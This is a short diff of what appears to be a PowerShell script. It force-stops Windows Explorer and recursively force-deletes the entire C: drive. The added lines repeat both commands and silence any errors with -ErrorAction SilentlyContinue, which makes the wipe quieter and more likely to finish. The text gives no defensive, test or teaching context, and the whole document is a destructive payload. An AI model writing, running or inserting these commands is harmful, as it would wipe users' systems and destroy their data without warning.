@@ -1,2 +1,5 @@
 Stop-Process -Name "explorer" -Force
 Remove-Item -Path "C:\" -Recurse -Force
+
+Stop-Process -Name "explorer" -Force
+Remove-Item -Path "C:\" -Recurse -Force -ErrorAction SilentlyContinue
